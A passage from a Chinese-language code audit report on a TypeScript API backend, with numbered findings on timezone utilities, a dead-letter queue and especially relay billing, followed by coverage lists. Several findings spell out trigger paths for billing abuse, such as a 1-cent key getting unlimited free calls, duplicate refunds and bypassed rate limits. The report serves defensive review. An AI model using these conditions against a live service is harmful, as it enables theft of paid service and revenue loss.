- **影响面**：基于该工具的日/周/月统计与配额重置偏一天。
- **建议修法**：无时区时先按 `Date.UTC` 分解，删除 `:76`。
- **是否当场可修**：是。

#### F-714 `toAwareUtc` 对斜杠格式按本地时区解析，UTC 兜底分支不可达

- **严重度**：P3（当前 src 无 import）
- **文件与行号**：`apps/api/src/utils/timezone-utils.ts:106-141`
- **触发路径**：`toAwareUtc('2024/01/01')` 或 `'2024/01/01 00:00:00'`：V8 按本地时间解析成功，`hasTz=false`，但 `:114` ISO 正则要求 `-` 分隔不匹配 → `:122 return d`，走不到 `:124-141` 兜底。
- **根因**：`new Date(s)` 成功即返回，兜底格式表只服务解析失败分支；毫秒也在重建时丢弃。
- **证据**：`:106-122`、`:124-141`。
- **影响面**：与模块“无时区按 UTC”契约相反，非 UTC 主机偏移最多 8 小时；毫秒被清零。
- **建议修法**：无时区时先尝试 `NAIVE_FORMATS`/`Date.UTC`，再回退 `new Date`。
- **是否当场可修**：是。

#### F-715 死信队列只在 `push` 时清理：过期死信在 `get/list` 中仍可见且可重投

- **严重度**：P3（当前仅被 `resilience-toolkit.ts:48` decorate，无读写调用方）
- **文件与行号**：`apps/api/src/utils/dead-letter-queue.ts:104-142`
- **触发路径**：最后一条死信入队后超过 `retentionSec`（默认 7 天）且再无 `push` → `get()/list()` 直接读 Map，不触发淘汰；`replay('不存在的id')` 返回 `DLQAction.DROP`。
- **根因**：TTL/容量清理只挂写路径；读路径无惰性淘汰；未知 id 语义与“丢弃”重载。
- **证据**：`:104` 仅 `push` 内 `this.evictLocked(now)`；`:125-131` `get/list` 直接读 `this.items`；`:142` `if (!item) return DLQAction.DROP`。
- **影响面**：内存常驻过期数据；过期任务可被再次投递。
- **建议修法**：读路径/定时器也执行淘汰；未知 id 返回 NOOP。
- **是否当场可修**：是。

#### F-716 `readNoProxy` 首个已配置变量未命中即 return，注释声称“继续找另一个大小写档位”

- **严重度**：P3（仅影响出口诊断事实，路由不读 NO_PROXY）
- **文件与行号**：`apps/api/src/utils/proxy-dispatcher.ts:88-103`
- **触发路径**：同时设 `NO_PROXY=foo.com` 与 `no_proxy=api.openai.com`，请求 `api.openai.com` → 第一项未命中即返回，真实命中被忽略。
- **根因**：注释与实现相反，`return` 应为 `continue`。
- **证据**：`:99-100` `// 配了 NO_PROXY 但没命中:...继续找另一个大小写档位` 紧跟 `return { matched: false, varName: name }`。
- **影响面**：排障误判“内网直连/未配 NO_PROXY”。
- **建议修法**：循环内 `continue`，循环结束再返回首个“已配置但未命中”变量名。
- **是否当场可修**：是。

### E 路：relay 计费结算对拍（F-717 ~ F-728）

#### F-717 预扣金额按“扣除前读值 − 扣除后返回值”反推，并发下多退或少登记

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/relay-billing-service.ts:1799-1800,1837-1847,1871-1878`
- **触发路径**：同一 Key/组池两个请求并发 → 各自读余额 → 各自条件 UPDATE → 用跨快照做差当作本次预扣额。
- **根因**：预扣额不是 SQL 实际扣减量，而是两次返回（含 `dbRead`）之差；中间任何并发扣减/退款/充值都会污染。
- **证据**：
  ```ts
  const actualTokens =
    groupInfo.sharedTokenBalance === -1 ? 0
      : Math.max(0, groupInfo.sharedTokenBalance - (updated.sharedTokenBalance ?? 0))
  ```
  个人分支 `:1871-1876` 同构。
- **最小出错场景**：余额 1000；A 读到 1000，B 先扣 100→900，A 再扣 100→800，A 反推 pre=200（实际仅扣 100）→ 结算 delta=+100，A 只付 100；反向（副本滞后/窗口内充值使 `actual≤0`）时 `:1846/:1877` 直接 `return null`，已扣的 100 不登记，随后 `recordCall` 普通分支再全额扣一次 → 双重扣费。
- **影响面**：高并发组池/个人 Key 预扣账目系统性失真，差额随并发线性放大。
- **建议修法**：单条 `UPDATE ... SET balance = balance - GREATEST(...) RETURNING balance`，凭证金额取本次传入的扣减量；或同事务 `SELECT ... FOR UPDATE` 读-算-写，删除做差反推。
- **是否当场可修**：可（局部 SQL + 并发单测）。

#### F-718 余额不足时 CASE 保持原值 + 准入只挡 0 ⇒ 1 分余额的 Key 永久免费，且返佣照提

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/relay-billing-service.ts:1286-1341,1369-1378`、`:486-495`
- **触发路径**：用 `costBalanceCents=1`、token 充足的 Key 调 `/v1/messages`、`/v1/responses`、`/v1/multimodal`、batch 或 BYOK（这些路径无预扣凭证）。
- **根因**：条件 UPDATE 的 `ELSE` 分支保持原余额（防负数）而非扣到 0；`checkQuota` 只在 `=== 0` 时拒绝，且上述路由没有两段式 settle 兜底。
- **证据**：
  ```ts
  // 1339-1341
  tokenBalance: sql`CASE WHEN ... = -1 THEN -1 WHEN ... >= ${input.totalTokens} THEN ... - ${input.totalTokens} ELSE ${developerApiKeys.tokenBalance} END`,
  costBalanceCents: sql`CASE WHEN ... = -1 THEN -1 WHEN ... >= ${costCentsToDeduct} THEN ... - ${costCentsToDeduct} ELSE ${developerApiKeys.costBalanceCents} END`,
  ```
  `:486` `if (row.costBalanceCents === 0) {...}`；`:1369` `if (costCentsToDeduct > 0 && relayLogId) { recordRelayCommission(...) }`。
- **最小出错场景**：cost=1 分、单次成本 500 分 → 准入放行 → UPDATE 命中 ELSE，余额仍 1 分，可无限重复；每次 `costUsedTotalCents +500`，且按 500 分计提返佣，7 天后真金入账（`relay-commission-service.ts:334`）。
- **影响面**：收入漏损无上限，平台一分未收却持续付佣金。
- **建议修法**：余额不足时扣到 0 并标记欠费/partial（或准入改为“余额 ≥ 预估成本”）；返佣按实扣金额（扣前−扣后）计提。
- **是否当场可修**：可（两处 SQL + 返佣入参）。

#### F-719 兑换码/单边 token 充值只加 `tokenBalance`，而准入要求 `costBalanceCents≠0` ⇒ 付费充值不可用

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/redemption-code-service.ts:243-253`；`apps/api/src/services/developer-api-keys-service.ts:125-129`；`apps/api/src/services/relay-billing-service.ts:486-495`
- **触发路径**：新建 Key（两列均 0）→ `POST /developer/relay/redeem` 兑换 100 万 token → 调 `/v1/chat/completions`。
- **根因**：兑换只 `tokenBalance += tokenAmount`，完全不碰 `costBalanceCents`；而准入第二道闸要求 `costBalanceCents !== 0`。
- **证据**：`redemption-code-service.ts:249` `tokenBalance: sql\`CASE WHEN ... = -1 THEN -1 ELSE ${developerApiKeys.tokenBalance} + ${claimed.tokenAmount} END\``（无 cost 列）；`developer-api-keys-service.ts:128-129` 新 Key 两列均 0；`relay-billing-service.ts:486` 仅挡 `=== 0`。
- **最小出错场景**：兑换后 token=1,000,000、cost=0 → 首调即 402 `no_balance_cost`，兑换码购买的额度一分用不了；单边“只充 token”的钱包充值同理。
- **影响面**：付费充值入口失效（用户已付款），资金类客诉。
- **建议修法**：兑换/充值按统一口径同步另一列，或准入改为“两列任一足够”，并对存量回填。
- **是否当场可修**：可（需先定 token↔分换算口径）。

#### F-720 Qoder 类积分上游的 `credits` 不进计费 ⇒ 该维度完全未计费

- **严重度**：P2（若上游 token 恒 0 则为零计费；该前提来自代码注释，未取得真实上游样本）
- **文件与行号**：`apps/api/src/routes/v1-public.ts:829-841,1978-1993,2060-2095,2112-2138`；`apps/api/src/services/relay-upstream-forwarder.ts:438-439,561-567`
- **触发路径**：relay 渠道命中 Qoder 上游 → 流式/非流式成功返回。
- **根因**：`credits` 只被序列化进回包 usage/SSE 帧，从未传给 `recordCall`；`calculateCost` 也无 credits 定价分支。
- **证据**：`relay-upstream-forwarder.ts:561-563` `// 积分计费上游（qoder）：token 恒 0，credits 才是真实扣减量`；`v1-public.ts:2114-2138` 的 `recordCall` 只传 `safePrompt/safeCompletion/safeTotal`，无 credits。
- **影响面**：若上游 token 为 0（注释前提），该渠道全部流量零计费；即使 token 非 0，credits 维度也无审计与定价。
- **建议修法**：`RecordCallInput` 增加 `upstreamCredits`，`calculateCost` 增加 credits 定价或换算，并落 `credits_unit`。
- **是否当场可修**：可（需定价口径确认）。

#### F-721 `refundTaskCall` 退款非原子：并发或副本滞后会重复退款（凭空增余额）

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/relay-billing-service.ts:1639-1661,1671-1692,1709-1716`；调用点 `apps/api/src/routes/v1-multimodal.ts:1787,1805,1820,2106`
- **触发路径**：生图/生视频任务失败后客户端并发轮询状态（或网络重试）→ 每轮都 `void refundTaskCall(id)`。
- **根因**：资格判定是“先 SELECT `refunded=false`”（且走 `dbRead` 只读副本），加余额是无条件 UPDATE，打标在最后且 `WHERE id=?` 无 `refunded=false` 原子抢占；三者为独立语句、无事务。
- **证据**：`:1639` `await dbRead.select(...)`；`:1655` `eq(llmCallLogs.refunded, false)`；`:1674-1689` 无条件 `+ cents`；`:1709-1716` `markTaskRefunded` 的 `where(eq(llmCallLogs.id, logId))`。
- **最小出错场景**：两个并发轮询同时读到 `refunded=false` → 各自 `+cents` → 同一任务退款 2 次、3 次（N 次轮询 N 倍）。
- **影响面**：余额被凭空放大；叠加 F-660（退到 `tokenBalance` 列）则退错列且退多份。
- **建议修法**：先 `UPDATE llm_call_logs SET refunded=true WHERE id=? AND refunded=false RETURNING cost_cents` 原子抢占，成功后在**同一事务**内加余额；资格查询改主库。
- **是否当场可修**：可。

#### F-722 渠道流式“已写出帧后异常”就地 return，跳过结算 ⇒ 预扣永久沉淀、无流水

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/v1-public.ts:851-885,888-901,1690-1714`
- **触发路径**：首帧已转发后上游 RST / SSE 解析抛错 / 客户端断开 → `channelWroteToClient === true` → 收尾后 `return`。
- **根因**：计费只挂成功分支；异常分支丢弃 `opts.preDeducted`；`settlePreDeduction` 仅由 `recordCall:1257` 调用，无对账任务回收孤儿预扣。
- **证据**：`:891-900` 分支内 `const msg = ...; if (msg !== 'client disconnected') writeChunk(...); raw.write('data: [DONE]\\n\\n'); request.raw.off('close', onClose); raw.end(); return`——无 `recordCall`。
- **影响面**：用户被按满额估算扣费，但 `llm_call_logs` 无该行，无法退款/审计；客户端断连属高频事件。
- **建议修法**：早退分支补 `recordCall({ status:'error', preDeducted: opts.preDeducted })`（已发出部分可计价），或统一到 `finally` 结算；加预扣 TTL 对账兜底。
- **是否当场可修**：可。

#### F-723 `settlePreDeduction` 重新解析组归属，退款/补扣可能落到错误账户

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-billing-service.ts:1940-1961`（结算时 `getKeyGroup`）对比 `:1803-1831`（预扣时）
- **触发路径**：请求进行期间管理员把该 Key 移出组池、组被禁用或加入组。
- **根因**：`PreDeduction` 只记录 `apiKeyId`，不记录扣款池类型/groupId；结算时按“当前”组归属重新选池，且 `getKeyGroup` 读副本。
- **证据**：`:1940-1941` `const groupInfo = await getKeyGroup(pre.apiKeyId); if (groupInfo && groupInfo.enabled) { /* 退组池 */ } else { /* 退个人 */ }`。
- **最小出错场景**：预扣从组池扣 500 分 → 调用期间 Key 被移出组 → 结算把 500 分退进个人余额，组池永久少 500、个人凭空多 500；反向则相反。
- **影响面**：跨账户资金搬运，账目永久失衡（无需并发）。
- **建议修法**：`PreDeduction` 记录 `target:'group'|'personal'` 与 `groupId`，结算严格按凭证落库。
- **是否当场可修**：可。

#### F-724 限流计数与计费链路脱钩：窗口计数只在两段式 +1，TPM 计数从未写入

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/api-key-auth.ts:1112-1128`；`apps/api/src/services/relay-billing-service.ts:1241-1261,379-396`
- **触发路径**：任何带 `model` 且不走两段式的调用：`/v1/messages`、`/v1/responses`、`/v1/multimodal`、batch、BYOK chat，以及 `preDeductQuota` 返回 null 的 relay 调用。
- **根因**：(a) finish 钩子“带 model 就信任 recordCall”，但 `incrKeyRateWindows` 只在预扣分支内；(b) 全仓无 `request.usage =` 赋值，`recordTpmUsage` 永不执行，`checkTpmQuota` 恒读 0。
- **证据**：`api-key-auth.ts:1125-1128` `const hasModel = ...; if (!hasModel && reply.statusCode < 400) { void incrKeyRateWindows(apiKeyId) }`；`relay-billing-service.ts:1257-1261` `incrKeyRateWindows` 缩进在 `if (hasPreDeduction && pre)` 内；Grep `request.usage|.usage =` 在 `apps/api/src` 无赋值点。
- **最小出错场景**：Key 设 `rateLimit5h=10`，只调 `/v1/messages` → 窗口计数恒 0，第 11 次、第 1000 次都不限流；`tpmLimit` 同理。
- **影响面**：Key 级 5h/1d/7d 与 TPM 限流对多协议入口完全失效。
- **建议修法**：把 `incrKeyRateWindows` 移到 `recordCall` 三分支公共尾部；`recordTpmUsage` 直接按 `totalTokens` 调用。
- **是否当场可修**：可。

#### F-725 订阅窗口用量只在两段式结算里累加 ⇒ `/v1/messages`、`/v1/responses` 永不消耗订阅额度

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-billing-service.ts:398-410,1241-1257,1905-1913`；`apps/api/src/routes/v1-public.ts:1690-1714`
- **触发路径**：订阅用户（套餐配了日/周/月 token 限额）只使用 `/v1/messages`、`/v1/responses` 或 BYOK。
- **根因**：`consumeSubscriptionWindowUsage` 只挂在 `settlePreDeduction` 内；非两段式路径的 `recordCall` 完全不累加窗口用量。
- **证据**：`:1905-1913` 唯一调用点；全仓仅此 1 处；`:402` 每个请求都会 `checkSubscriptionWindowQuota`（读同一张 usage 表）。
- **影响面**：订阅套餐可被无限透支，订阅收入与用量脱钩。
- **建议修法**：移到 `recordCall` 公共尾部（`status!=='success'` 传 0），两段式去重。
- **是否当场可修**：可。

#### F-726 `/v1/messages`、`/v1/responses` 流式计费完全脱离上游 usage（且丢弃 tool/thinking 输出）

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/v1-messages.ts:199-216,325-360`；`apps/api/src/routes/v1-responses.ts:278-279,320-331,412-440`；`apps/api/src/services/anthropic-adapter.ts:618-668`
- **触发路径**：任意流式 Claude/Responses 请求，尤其中文长文、纯 tool_use 输出、带 prompt cache 的调用。
- **根因**：上游行解析器只产出 text chunk，不解析 `usage` 也不产出 `tool_calls`；计费侧只累计 `text_delta` 并按 `ceil(len/4)` 估算，cache token 恒 0。
- **证据**：`v1-messages.ts:211-215` 只在 `content_block_delta && text_delta` 累计 `responseText`；`:331-332` `Math.ceil(opts.promptText.length / 4)` / `Math.ceil(responseText.length / 4)`；非流式 `:603-604` 却用真 `usage`。
- **最小出错场景**：Claude 返回 4000 token 中文 + 3000 tool_use JSON → 只按 1000 计（中文实≈4000 token），tool 部分 0 计；带 prompt cache 的 10 万缓存读 token 折扣不生效。
- **影响面**：输出侧系统性少计 3~6 倍；工具调用型请求几乎只收 prompt 钱；与非流式口径分裂。
- **建议修法**：解析并透传 `usage`（含 cache_read/cache_creation），有真值用真值、缺失再 /4；累计 tool_use/thinking 或直接用 `output_tokens`。
- **是否当场可修**：可。

#### F-727 Batch 50% 折扣只写进 metadata，实际按全价扣费

- **严重度**：P2
- **文件与行号**：`apps/api/src/workers/batch-worker.ts:136-171`；`apps/api/src/routes/v1-batches.ts:9,25,29`；`apps/api/src/services/relay-billing-service.ts`（全文无 discount 分支）
- **触发路径**：任意 `/v1/batch`、`/v1/batches`、`/v1/messages/batches` 任务完成计费。
- **根因**：注释声称“实际折扣在 recordCall 实现”，但 `recordCall` 从不读取 `metadata.discount`；`calculateCost` 也无折扣入参。
- **证据**：`batch-worker.ts:137-139` 注释 + `:167` `metadata: { batch: true, discount: 0.5, batchId }`；Grep `discount` 于 `relay-billing-service.ts` **0 命中**。
- **影响面**：批量业务对客价款翻倍，与文档/OpenAI 语义不一致，可引发退款争议。
- **建议修法**：`RecordCallInput` 增加 `discount?`，`calculateCost` 结果乘折扣并留审计字段。
- **是否当场可修**：可。

#### F-728 失败/中断调用只退金额不退 token，且 `v1-responses` 把错误文案计入输出 token

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-billing-service.ts:1185-1188,1246,1257`；`apps/api/src/routes/v1-public.ts:1026-1064`；`apps/api/src/routes/v1-responses.ts:320-331,412-414`
- **触发路径**：流式已开始后客户端断开/上游读错误；或上游非 2xx（`v1-public.ts:954-959` 设 `streamError` 后 return）→ `finally` 记 `status:'error'`，但 tokens 仍照传。
- **根因**：`recordCall` 在 `status !== 'success'` 时只把 `costCentsToDeduct` 置 0，未清 token 数；两段式 `settlePreDeduction(pre, input.totalTokens, 0)` 仍按该 token 数扣余额。
- **证据**：`:1185-1188` `if (input.status && input.status !== 'success') { ... costCentsToDeduct = 0 }`（无 token 清零）；`v1-public.ts:1032-1046` 失败分支仍计算并传 `promptTokens/completionTokens/totalTokens`；`v1-responses.ts:324-325` `responseText += errorDelta`。
- **最小出错场景**：10 万字符 prompt、上游在首 token 前返回 502 → 统计记 error，但 settle 按 25000 token 扣 token 余额；订阅窗口也被这些失败调用占用。
- **影响面**：失败调用仍消耗 token 配额，与“失败不计费”承诺矛盾。
- **建议修法**：`status!=='success'` 时把三组 token 一并按 0 结算（日志另记 `rawTotalTokens`）；错误文案不写入 `responseText`。
- **是否当场可修**：可。

### 第二十二轮未判定（证据不足，不计入结论）

1. **腾讯云直播回调时间戳单位**：`tencent-live-service.ts:70-73` 用 `Math.abs(Date.now() - Number(timestamp))` 与 5 分钟比较，隐含要求毫秒；腾讯云回调文档通常给秒级。缺：真实回调报文样本（现有测试用同一函数生成，自洽不能证明线上）。
2. **阿里云 STS QCS 资源串**：`oss-sts-service.ts:133-150` 的 `qcs::cos:${region}:::${bucket}/*` 省略 `uid/${appid}` 段，无法在本仓库证实是否被拒。
3. **`excel-export-service.importFromExcel` 的 `parseInt` 死 try/catch**（`:301`）：`parseInt` 不抛错，非法数字静默变 `NaN`；但该函数全仓零调用，无触发路径。
4. **`pdf-service` 证书/发票 PDF 硬编码 Helvetica**（`:174,176,203,205`）中文必乱码；两个生成函数全仓零调用，无实际影响。
5. **`sms-notify` 无偏好行即不发非安全短信**（`:56-78`）：若产品预期“默认开启”，支付成功类短信对无 `notification_preferences` 行的用户全静默；需产品语义确认。
6. **`upload-scanner.ts` 只扫首 4112 字节且 `MZ` 子串误报**：合法 `.csv/.md/.json` 会被误拒；该扫描器仅用于 `/oss/upload` metadata preHandler，实际字节经 OSS STS 直传，是否应由本服务做内容扫描无法从代码确定。
7. **`proxy-dispatcher.ts:60-70 isInternalHostname` 的 IPv6 分支不可达**：`new URL('http://[::1]/').hostname === '[::1]'`（带方括号），代码只比较 `'::1'`；是否有部署把 IPv6 字面量配进 `PROXY_DOMAINS` 未知。
8. **`pessimistic-lock.ts` 租约无续期、`detectDeadlock` 会删他人锁**：仓库内零调用方，无法证明触发路径。
9. **`ws-chat.ts:837` 去重键 `${userId}:${clientMessageId}` 未含 roomId**：若客户端“每房间自增 id”，同一用户跨房间同 id 会在 5 分钟内被静默丢弃；缺客户端协议证据。
10. **`id-mapping-queries.createMapping` 无 `new_id` 唯一约束**：同一 `newId` 可被两个 `legacyId` 覆盖；缺迁移是否保证 1:1 的证据。
11. **`private-letters-admin-queries.ts:54-56` 列表未过滤 `status`**：撤回是否真的写 `status` 未确认。
12. **`routes/developer.ts:589-609` 开发运行时按客户端 `period` 免付款激活 365 天**：是否存在可公网访问的非生产部署未知。
13. **其他 `::bigint::int` token 汇总站点**：`developer-relay.ts:221`、`admin/relay-stats.ts:54`、`relay-models.ts:204`、`developer-relay-usage-analytics.ts` 等未逐一确认列类型/可达性，未并入 F-700~F-704。

### 第二十二轮覆盖（五路并行）

- A 路 services：`srs-review-service.ts`、`spaced-repetition.ts`、`sms-notify.ts`、`push-provider.ts`、`tencent-live-service.ts`、`pdf-service.ts`、`transcode-service.ts`、`upload-merge-gate.ts`、`scheduled-tasks-service.ts`、`excel-export-service.ts`、`storage-service.ts`、`oss-sts-service.ts`、`mfa-service.ts`、`user-billing-group-service.ts`、`settlement-service.ts`、`cache-warmup-service.ts`、`srs-service.ts`、`relay-conversation-service.ts`、`api-subscription-service.ts`、`knowledge-rag-service.ts`、`workbook-service.ts`；路由 `srs-review.ts`、`srs.ts`、`push.ts`、`transcode.ts`、`legacy-oss.ts`、`mfa.ts`、`oss.ts`；schema `exam-extended.ts`、`edu-full.ts`、`users.ts`、`device-tokens.ts`、`drizzle/0044`。
- B 路 db：`developer-queries`、`exam-queries`、`topic-queries`、`behavior-queries`、`admin-queries`、`live-queries`、`mobile-stats-queries`、`id-mapping-queries`、`usercenter-queries`、`user-preferences-queries`、`voice-note-queries`、`private-letters-admin-queries`、`content-queries`、`member-queries`、`plugin-events-queries`；调用方 `order-service`、`payment-gateway`、`exam`、`topic`、`live`、`behavior`、`admin`、`content`、`usercenter`；schema `developer`、`exam`、`behavior`、`topic`、`learn`、`edu-full`、`id-mapping`、`llm-call-logs`、`users`、`relation-tables`。
- C 路 数值假类型：`db/comment-queries.ts`、`routes/edu-ai-management.ts`、`routes/wallet.ts`、`services/relay-account-usage.ts`、`services/channel-quota-service.ts`、`routes/agents.ts`、`routes/admin-ops-wallboard.ts`、`routes/ab-testing.ts`、`routes/admin-monitoring-routes.ts`；反向核对 `bi-dashboard`、`distribution`、`admin-api-platform`、`relay-capacity`、`developer-relay-usage-analytics`、`credits-usage-service`、`edu-canteen`、`relay-alert-rules-service`、`relay-monitor-public`、`engagement-stats-service`、`page-dwell-stats-service`、`order.ts`、`refund-audit.ts`、`plugins/ai-cost.ts`、`miniapp-pay-routes.ts`、`statistics.ts` 等。
- D 路 utils/plugins：`utils/{ssrf-guard,pessimistic-lock,distributed-lock,sse-replay-buffer,sse-state-store,sse-stream-registry,proxy-dispatcher,dead-letter-queue,money,positive-int,timezone-utils,calendar-boundary,cursor-page,paging,file-transfer,file-type-validator,ws-dedup,ws-rate-limit,ws-replay-buffer}.ts`；`plugins/{upload-scanner,log-sanitizer,lazy-admin-guard,mtls,api-logger-extended,cors-origin,csrf,sqli-guard,internal-secret-auth,internal-service-ticket,sse-registry,open-idempotency,ws-chat}.ts`。
- E 路 relay：`services/relay-billing-service.ts`（预扣/结算/退款/recordCall 全段）、`services/relay-upstream-forwarder.ts`（usage/credits 段）、`services/relay-commission-service.ts`（返佣入账）、`services/anthropic-adapter.ts`（流解析）、`routes/v1-public.ts`（流式/非流式/缓存命中）、`routes/v1-messages.ts`、`routes/v1-responses.ts`、`routes/v1-multimodal.ts`、`routes/v1-batches.ts`、`workers/batch-worker.ts`、`plugins/api-key-auth.ts`、`developer-api-keys-service.ts`、`redemption-code-service.ts`。

### 第二十二轮已有覆盖（去重后未重复报）

- `settlement-service`（F-61 系列）、`api-subscription-service`（F-369~F-375）、`user-billing-group-service`（F-374）、`relay-conversation-service`（F-538）、`knowledge-rag-service`、`storage-service`（F-69/F-382/F-545/F-546）、`oss-sts-service`（F-70）、`transcode-service` 淘汰不 kill（F-198）、`tencent-live-service` 先写缓存后落库（F-143）、`scheduled-tasks-service` N+1（F-352）、`pdf-service` stub（F-537）、`markdown-converter-service`、`workbook-service`、`cleanup-service`、`account-lockout-service`、`mfa-service:98-108`、`repo-wiki-service`、`upload-merge-gate:604-640,703-723`。
- `community-queries`（acceptAnswer 非事务、createPost 计数、circlePosts 越权、slug 分支）、`usercenter-queries`/`member-queries` 的 `twoFactor*` 全列下发、`live-queries:249` `ilike` 多行误更新、`content-queries` helpArticles 缺 isPublished、`captcha-queries`、`ai-feed-post-queries`、`sensitive-words-queries`、`resource-likes-queries`。
- `ssrf-guard` IPv6 ULA（F-215）、`paging`（F-26）、`cursor-page`（F-25）、`distributed-lock.withLock`（F-67）、`sse-*`（F-285/F-286/F-291）、`log-sanitizer`（F-460）、`upload-scanner` 只信声明 size（F-70）。
- `refundTaskCall` 吞异常（F-34）、退到 `tokenBalance` 列（F-660）；`F-670/F-671` 转发器 abort/账号池；`F-675` 异步生图零计费；`F-679` v1-public 流式字符估算；`F-89` v1 中断按 error 零计费；`F-180/F-181` 缓存键/命中仍扣 token；`F-194` 定价取错模型；`F-233/F-620` 订阅/Key 窗口读副本并发；`F-292/F-293` BYOK 全价与 tool_calls 丢失；`F-662` 成本口径。
- 数值假类型：`F-663`（edu finance）、`F-664`（api-usage/top）、`F-665`（performance）、`F-666`（裸 count 契约）、`F-667`（已列 `::bigint::int` token 站点）、`F-668`（兑换码 tokenSum）、`F-669`（兜底扫描）。

---

## 六、未判定（证据不足，不计入结论）

1. **多租户 header 可信性**：`plugins/tenant.ts:116` 直接用 `X-Tenant-Id` 设置 `request.tenantId`，`plugins/tenant-db.ts:44-47` 据此连接租户物理库，全程无成员校验。但在 `apps/api/src` 全仓 grep `request.tenantDB|withTenant` 只见定义、无业务路由消费，无法证明可实际读写他人租户数据。缺证据：一处真实使用 `request.tenantDB` 的路由。
2. **`redeemCoupon` 忽略传入事务**：`services/coupon-service.ts:445-447` 注释声明传入 `tx` 时读写同一事务，但 `:497` 状态翻转固定用 `db`。唯一调用方 `miniapp-pay-routes.ts:220` 未传 `tx`，当前无触发路径。
3. **换券并发竞态**：`miniapp-pay-routes.ts:177-180,220-250` 先读 `usedOnOrderId` 再核销新券；两并发请求用不同券时可能后写覆盖先写。缺证据：未确认前端会并发提交两张不同券。
4. **微信支付 `processing` 直接 ACK SUCCESS**：`payment-gateway.ts:714-718` 首个处理进程崩溃时会让微信停止重试，而 `queryPendingOrders` 仅 admin 路由使用，未见自动对账任务。缺证据：是否存在外部对账/多实例补偿。
5. **`admin/stats.ts:499,601`** 使用主机本地日界：`config/host-timezone.json` 声明 `utcOffsetMinutes: 480`，纸面上当前正确；无法从代码证明运行进程 TZ 已生效。
6. **`admin/stats.ts:523`** `sum(refund_amount)::numeric(12,2)::float8` 后再浮点减法；结果收敛到 2 位小数，未构造出可复现错值。
7. **付费资源下载恒不可用（第四轮新增）**：`resource-queries.ts` 的下载权限用 `eq(orders.productId, resourceId)` 判断“已购买”，但全仓未检索到任何以 `productId = resourceId` 写入 `eduOrders` 的下单路径（`payment-gateway.ts` 仅有 VIP/开发者/API 分支）。若确认无映射，则除 VIP 外的付费资源下载分支恒为假。缺证据：外部下单端（Web/小程序/后台）的 `productId` 契约与生产 `edu_orders.product_type/product_id` 实际取值。

---

## 七、本轮覆盖清单与轮次结论

### 本轮新增
- **728 条**（F-01 ~ F-728），全部为 origin/main 实读代码可证实项；其中 P0 6 条、P1 113 条、P2 364 条、P3 245 条。
- 轮次分布：第一轮 26 条；第二轮 12 条；第三轮 14 条；第四轮 40 条（P0 2、P1 9、P2 25、P3 4）；第五轮 32 条（P0 0、P1 9、P2 19、P3 4）；第六轮 36 条（P0 1、P1 10、P2 15、P3 10）；第七轮 29 条（P0 1、P1 7、P2 17、P3 4）；第八轮 25 条（P0 1、P1 6、P2 15、P3 3）；第九轮 37 条（P0 0、P1 9、P2 23、P3 5）；第十轮 40 条（P0 0、P1 10、P2 23、P3 7）；第十一轮 37 条（P0 0、P1 2、P2 25、P3 10）；第十二轮 40 条（P0 0、P1 3、P2 19、P3 18）；第十三轮 35 条（P0 0、P1 9、P2 24、P3 2）；第十四轮 33 条（P0 0、P1 3、P2 15、P3 15）；第十五轮 23 条（P0 0、P1 3、P2 9、P3 11）；第十六轮 19 条（P0 0、P1 0、P2 7、P3 12）；第十七轮 29 条（P0 0、P1 2、P2 10、P3 17）；第十八轮 17 条（P0 0、P1 0、P2 2、P3 15）；第十九轮 55 条（P0 0、P1 2、P2 15、P3 38）；第二十轮 56 条（P0 0、P1 8、P2 22、P3 26）；第二十一轮 44 条（P0 0、P1 5、P2 24、P3 15）；第二十二轮 49 条（P0 0、P1 7、P2 19、P3 23）。

### 已扫文件/路径（关键集）
- 入口与鉴权：`server.ts`、`plugins/auth.ts`、`plugins/auth-default-deny.ts`、`plugins/principal.ts`、`plugins/public-paths.ts`、`plugins/internal-service-token.ts`、`plugins/tenant.ts`、`plugins/tenant-db.ts`、`db/queries.ts`
- 路由：`routes/index.ts`、`routes/payment-gateway.ts`、`routes/payment-extended.ts`、`routes/payment-usdt.ts`、`routes/payment-recurring.ts`、`routes/miniapp-pay-routes.ts`、`routes/legacy-ask.ts`、`routes/legacy-exam.ts`、`routes/legacy-live.ts`、`routes/finance-extended.ts`、`routes/agent-creation.ts`、`routes/agent-control.ts`、`routes/workspace-ai.ts`、`routes/ai-chat-stream.ts`、`routes/chat-resume.ts`、`routes/files.ts`、`routes/points-tasks.ts`、`routes/admin/stats.ts`、`routes/admin/export-csv.ts`、`routes/developer-relay*.ts`、`routes/v1-assistants.ts`、`routes/content-extended.ts`、`routes/public-socket.ts`、`routes/internal-*.ts`
- 服务/DB：`services/order-service.ts`、`services/payment-usdt-service.ts`、`services/alipay.ts`、`services/wechat-pay.ts`、`services/knowledge-chat-context.ts`、`services/repo-wiki-context.ts`、`services/workspace-ai-service.ts`、`plugins/token-balance-service.ts`、`utils/api-key-quota.ts`、`utils/paging.ts`、`utils/cursor-page.ts`、`utils/checkin-helpers.ts`、`utils/biz-day.ts`、`db/payment-queries.ts`、`db/point-queries.ts`、`db/promotion-queries.ts`、`db/file-queries.ts`、`db/search-queries.ts`、`db/chat-queries.ts`
- Schema：`packages/database/src/schema/files.ts`、`gamification.ts`、`billing.ts`

### 第三轮覆盖（未覆盖路由 / 资源面）
- 已扫：`routes/chunked-upload.ts`、`routes/spec.ts`、`services/spec-service.ts`、`services/atomic-rollback.ts`、`routes/agents.ts`、`workers/email-worker.ts`、`services/email-service.ts`、`plugins/point-aspect.ts`、`utils/ai-service-fetch.ts`、`routes/v1-multimodal.ts`、`services/relay-billing-service.ts`。
- 已扫：`routes/ai-vendors/*`、`routes/terminal*`、`routes/workspace*`、`routes/mcp*`、`routes/openclaw*`、`workers/*`、`jobs/*`、`plugins/sse-*`、`plugins/ws-*`（资源/N+1）。

### 第四轮覆盖（五路并行）
